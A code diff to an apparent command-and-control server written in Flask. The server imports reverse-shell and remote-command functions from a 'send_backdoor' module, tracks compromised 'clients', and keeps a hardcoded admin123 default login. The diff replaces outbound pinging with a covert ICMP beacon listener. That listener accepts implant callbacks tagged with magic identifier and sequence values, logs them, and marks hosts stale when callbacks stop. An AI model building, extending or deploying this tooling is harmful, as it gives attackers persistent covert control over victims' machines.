@@ -1,4 +1,3 @@
-import atexit
 import datetime
 import hashlib
 import logging
@@ -6,16 +5,16 @@ import os
 import socket
 import sqlite3
 import threading
+import time
 from functools import wraps
 
 import jwt
-from apscheduler.schedulers.background import BackgroundScheduler
 from dotenv import load_dotenv
 from flask import Flask, g, jsonify, request
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 
-from ping import ping, ping_batch
+from ping import start_icmp_listener
 from send_backdoor import trigger_reverse_shell
 from send_cmd import send_command
 
@@ -77,19 +76,11 @@ def init_db():
     )
     db.execute(
         """
-        CREATE TABLE IF NOT EXISTS settings (
-            key TEXT PRIMARY KEY,
-            value TEXT NOT NULL
-        )
-    """
-    )
-    db.execute(
-        """
-        CREATE TABLE IF NOT EXISTS ping_log (
+        CREATE TABLE IF NOT EXISTS beacon_log (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             timestamp TEXT NOT NULL DEFAULT (datetime('now')),
-            total_clients INTEGER NOT NULL,
-            responsive INTEGER NOT NULL
+            ip_address TEXT NOT NULL,
+            identifier TEXT
         )
     """
     )
@@ -113,17 +104,6 @@ def init_db():
         )
     """
     )
-    db.commit()
-
-    # Seed default settings if not exists
-    defaults = {
-        "ping_interval": "30",
-    }
-    for key, value in defaults.items():
-        db.execute(
-            "INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
-            (key, value),
-        )
     db.commit()
 
     # Seed default admin user if not exists (password: admin123)
@@ -457,6 +437,7 @@ def get_stats():
 @app.route("/api/contact-rate", methods=["GET"])
 @auth_required
 def contact_rate():
+    """Return recent beacon callbacks."""
     range_param = request.args.get("range", "month")
 
     modifiers = {
@@ -469,57 +450,26 @@ def contact_rate():
     db = get_db()
     if range_param in modifiers:
         rows = db.execute(
-            "SELECT timestamp, total_clients, responsive FROM ping_log "
-            "WHERE timestamp >= datetime('now', ?) ORDER BY timestamp ASC",
+            "SELECT timestamp, ip_address, identifier FROM beacon_log "
+            "WHERE timestamp >= datetime('now', ?) ORDER BY timestamp DESC",
             (modifiers[range_param],),
         ).fetchall()
     else:
         rows = db.execute(
-            "SELECT timestamp, total_clients, responsive FROM ping_log "
-            "ORDER BY timestamp ASC"
+            "SELECT timestamp, ip_address, identifier FROM beacon_log "
+            "ORDER BY timestamp DESC"
         ).fetchall()
 
     return jsonify(
         [
             {
                 "timestamp": row["timestamp"],
-                "total": row["total_clients"],
-                "responsive": row["responsive"],
+                "ip_address": row["ip_address"],
+                "identifier": row["identifier"],
             }
             for row in rows
         ]
     )
-
-
-@app.route("/api/settings", methods=["GET"])
-@auth_required
-def get_settings():
-    db = get_db()
-    rows = db.execute("SELECT key, value FROM settings").fetchall()
-    return jsonify({row["key"]: row["value"] for row in rows})
-
-
-@app.route("/api/settings", methods=["PUT"])
-@auth_required
-def update_settings():
-    data = request.get_json()
-    if not data:
-        return jsonify({"error": "Request body required"}), 400
-
-    db = get_db()
-    for key, value in data.items():
-        db.execute(
-            "UPDATE settings SET value = ? WHERE key = ?",
-            (str(value), key),
-        )
-    db.commit()
-
-    if "ping_interval" in data:
-        scheduler.reschedule_job(
-            "ping_clients", trigger="interval", seconds=int(data["ping_interval"])
-        )
-
-    return jsonify({"message": "Settings updated"})
 
 
 # ---------------------------------------------------------------------------
@@ -664,91 +614,104 @@ def handle_disconnect():
 logger = logging.getLogger(__name__)
 
 
-def ping_clients():
-    """Ping all clients using a single socket and update their status in the database."""
-    db = sqlite3.connect(DATABASE)
-    db.row_factory = sqlite3.Row
-    clients = db.execute("SELECT id, identifier, ip_address FROM clients").fetchall()
+# ---------------------------------------------------------------------------
+# ICMP Beacon Listener
+# ---------------------------------------------------------------------------
 
-    if not clients:
-        logger.debug("No clients to ping")
-        return
+# How long (in seconds) before a client is considered non-responsive
+BEACON_TIMEOUT_SECONDS = 60 * 2
+# How often (in seconds) to check for stale clients
+STALE_CHECK_INTERVAL = 30 * 2
 
-    identifiers = [c["identifier"] for c in clients]
-    logger.debug("Running ping checks on %d clients: %s", len(clients), ", ".join(identifiers))
+
+def handle_beacon(src_ip, pkt_id, pkt_seq, payload):
+    """Handle incoming ICMP beacon from client.
+
+    Args:
+        src_ip: Source IP address string
+        pkt_id: ICMP identifier (e.g., 0xDEAD)
+        pkt_seq: ICMP sequence number (e.g., 0x1337)
+        payload: Raw bytes payload
+    """
+    logger.debug(
+        "Beacon from %s | id=0x%04x seq=0x%04x | payload=%s",
+        src_ip, pkt_id, pkt_seq, payload
+    )
 
     now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+    db = sqlite3.connect(DATABASE)
 
-    ip_list = [c["ip_address"] for c in clients]
-    results = ping_batch(ip_list)
-
-    for client in clients:
-        ip = client["ip_address"]
-        reachable = results.get(ip)
-        logger.debug(
-            "Ping %s (%s): %s", client["identifier"], ip,
-            "responsive" if reachable else "non-responsive",
-        )
-        if reachable:
-            db.execute(
-                "UPDATE clients SET status = 'responsive', last_seen = ? WHERE id = ?",
-                (now, client["id"]),
-            )
-        else:
-            db.execute(
-                "UPDATE clients SET status = 'non-responsive' WHERE id = ?",
-                (client["id"],),
-            )
-
-    # Log this ping cycle
-    responsive_count = db.execute(
-        "SELECT COUNT(*) FROM clients WHERE status = 'responsive'"
-    ).fetchone()[0]
+    # Update client status
     db.execute(
-        "INSERT INTO ping_log (timestamp, total_clients, responsive) VALUES (?, ?, ?)",
-        (now, len(clients), responsive_count),
+        "UPDATE clients SET status = 'responsive', last_seen = ? WHERE ip_address = ?",
+        (now, src_ip),
     )
+
+    # Get client identifier for logging
+    row = db.execute(
+        "SELECT identifier FROM clients WHERE ip_address = ?", (src_ip,)
+    ).fetchone()
+    identifier = row[0] if row else None
+
+    # Log beacon to beacon_log
+    db.execute(
+        "INSERT INTO beacon_log (timestamp, ip_address, identifier) VALUES (?, ?, ?)",
+        (now, src_ip, identifier),
+    )
+
     db.commit()
     db.close()
 
 
-def get_ping_interval():
-    """Read the ping interval from settings."""
+def check_stale_clients():
+    """Mark clients as non-responsive if no beacon received within timeout."""
+    cutoff = (
+        datetime.datetime.now(datetime.timezone.utc)
+        - datetime.timedelta(seconds=BEACON_TIMEOUT_SECONDS)
+    ).strftime("%Y-%m-%d %H:%M:%S")
+
     db = sqlite3.connect(DATABASE)
-    row = db.execute(
-        "SELECT value FROM settings WHERE key = 'ping_interval'"
-    ).fetchone()
-    db.close()
-    return int(row[0]) if row else 30
-
-
-scheduler = BackgroundScheduler()
-atexit.register(lambda: scheduler.shutdown(wait=False) if scheduler.running else None)
-
-
-def start_scheduler():
-    if scheduler.running:
-        scheduler.shutdown(wait=False)
-    interval = get_ping_interval()
-    logger.debug("Starting scheduler with ping interval: %d seconds", interval)
-    scheduler.add_job(
-        ping_clients,
-        "interval",
-        seconds=interval,
-        id="ping_clients",
-        replace_existing=True,
+    cursor = db.execute(
+        """UPDATE clients SET status = 'non-responsive'
+           WHERE status = 'responsive'
+           AND (last_seen IS NULL OR last_seen < ?)""",
+        (cutoff,),
     )
-    scheduler.start()
+    if cursor.rowcount > 0:
+        logger.debug("Marked %d client(s) as non-responsive", cursor.rowcount)
+    db.commit()
+    db.close()
+
+
+def _stale_checker_loop():
+    """Background thread loop that periodically checks for stale clients."""
+    while True:
+        time.sleep(STALE_CHECK_INTERVAL)
+        try:
+            check_stale_clients()
+        except Exception as e:
+            logger.error("Stale client check failed: %s", e)
+
+
+def start_beacon_listener():
+    """Start the ICMP beacon listener and stale client checker."""
+    logger.info("Starting ICMP beacon listener...")
+    start_icmp_listener(handle_beacon, magic_id=0xBEEF, magic_seq=0x1337)
+
+    logger.info("Starting stale client checker (timeout=%ds, interval=%ds)...",
+                BEACON_TIMEOUT_SECONDS, STALE_CHECK_INTERVAL)
+    stale_thread = threading.Thread(target=_stale_checker_loop, daemon=True)
+    stale_thread.start()
 
 
 with app.app_context():
     init_db()
-    # Avoid double scheduler when Flask reloader is active
+    # Avoid double startup when Flask reloader is active
     if os.environ.get("WERKZEUG_RUN_MAIN") == "true" or not app.debug:
-        logger.debug("Scheduler guard passed, starting scheduler...")
-        start_scheduler()
+        logger.debug("Starting beacon listener...")
+        start_beacon_listener()
     else:
-        logger.debug("Skipping scheduler start (reloader parent process)")
+        logger.debug("Skipping beacon listener start (reloader parent process)")
 
 
 if __name__ == "__main__":
